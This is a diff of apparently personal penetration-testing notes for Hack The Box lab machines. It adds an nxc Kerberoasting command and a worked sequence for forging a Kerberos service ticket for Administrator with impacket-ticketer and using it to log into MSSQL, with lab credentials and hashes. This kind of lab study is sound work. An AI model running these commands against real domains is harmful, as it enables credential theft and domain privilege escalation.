@@ -146,10 +146,10 @@ Rubeus.exe kerberoast
 GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 ```
 
-### Transferring Files
+NXC Kerberoasting (Using kerberos auth)
 
-```sh
-python2.7 -m pyftpdlib -p 21 --write
+```
+nxc ldap dc1.scrm.local -u ksimpson -p ksimpson -d scrm.local -k --kerberoasting hash
 ```
 
 ### Cracking Hashes
@@ -1305,5 +1305,33 @@ net group 'CORE STAFF'
 ```
 
 <figure><img src="../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+<details>
+
+<summary>Request TGS for Administrator</summary>
+
+Currently have sqlsvc account --> want to request a TGS ticket for administrator.
+
+```
+# Converting password to NTLM hash
+echo -n 'Pegasus60' | iconv -t utf16le | openssl md4
+
+# Get Domain SID using impacket-getPac
+impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson
+# OR Get Domain SID using nxc
+nxc ldap dc1.scrm.local -u ksimpson -p ksimpson -d scrm.local -k --get-sid
+
+# Sync the clock of attacker machine to DC
+rdate -n dc1.scrm.local
+
+# Create TGS for administrator user:
+impacket-ticketer -spn "MSSQLSvc/dc1.scrm.local" -user "ksimpson" -password "ksimpson" -nthash "B999A16500B87D17EC7F2E2A68778F05" -domain scrm.local -domain-sid "S-1-5-21-2743207045-1827831105-2542523200" -dc-ip dc1.scrm.local Administrator
+
+# Using TGS to login to MSSQL DB
+export KRB5CCNAME=Administrator.ccache
+impacket-mssqlclient administrator@dc1.scrm.local -k -no-pass
+```
 
 </details>
